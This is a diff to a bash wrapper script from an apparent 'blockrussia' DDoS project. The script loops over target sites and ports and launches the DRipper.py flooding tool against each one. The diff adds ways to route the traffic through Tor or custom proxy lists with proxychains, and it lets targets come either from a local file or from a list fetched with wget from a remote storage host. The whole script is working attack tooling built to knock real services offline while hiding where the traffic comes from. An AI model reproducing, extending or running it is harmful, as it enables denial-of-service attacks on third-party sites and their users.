@@ -4,12 +4,12 @@ function ripper() {
   local site=$1
   local port=$2
 
-  if [ -z ${PROXY_SERVER+x} ]; then
-    echo "Working using VPN. Please, ensure that VPN is UP and running"
+  if [ "$MODE" == "default" ]; then
+    echo "Working in default mode. Please, ensure that VPN is UP and running"
     cd /opt/blockrussia/ripper && python3 DRipper.py -s ${site} -p ${port} | awk -v prefix="[ddos-cats-$AGENT->$site:$port]: " '{ print prefix, $0 }'
-  else
-    echo "Working using Tor Network. Tyring to work through proxy"
-    echo "socks5 ${PROXY_SERVER} 9050" >> /etc/proxychains.conf
+  elif [ "$MODE" == "proxy" ] || [ "$MODE" == "proxy-custom" ] ; then
+    echo "Working using Tor Network. Tyring to work through proxies defined in configuration file"
+    cat /etc/proxychains.conf
 
     cd /opt/blockrussia/ripper && proxychains python3 DRipper.py -s ${site} -p ${port} | awk -v prefix="[ddos-cats-$AGENT->$site:$port]: " '{ print prefix, $0 }'
   fi
@@ -18,9 +18,28 @@ function ripper() {
 ## Execution block
 export -f ripper
 
+if [ "$MODE" == "proxy" ]; then
+  echo "socks5 ${PROXY_SERVER} 9050" >> /etc/proxychains.conf
+fi
+
+if [ "$MODE" == "proxy-custom" ]; then
+  custom_proxies_list=$(wc -l /opt/blockrussia/proxies.txt | awk '{print $1}')
+
+  if [ "$custom_proxies_list" -lt "1" ]; then
+    echo "No custom prxies defined!"
+    exit 1
+  fi
+
+  cat /opt/blockrussia/proxies.txt >> /etc/proxychains.conf
+fi
+
 while true; do
-  echo "Checking updates on remote :)"
-  wget https://fucku-russian-ship-dcats.fra1.digitaloceanspaces.com/targets.txt -O /opt/blockrussia/targets.txt
+  if [ "$TARGETS" == "local" ]; then
+    echo "Using local targets!"
+  else
+    echo "Checking updates on remote :)"
+    wget https://fucku-russian-ship-dcats.fra1.digitaloceanspaces.com/targets.txt -O /opt/blockrussia/targets.txt
+  fi
 
   echo "Targets:"
   echo "###############################"
@@ -29,6 +48,11 @@ while true; do
 
   start_from=$AGENT
   targets=$(wc -l /opt/blockrussia/targets.txt | awk '{print $1}')
+
+  if [ "$targets" -lt "1" ]; then
+    echo "No targets were defined!"
+    exit 1
+  fi
 
   echo "Start from: $start_from, Targets: $targets, AGENT: Agent-$AGENT"
 
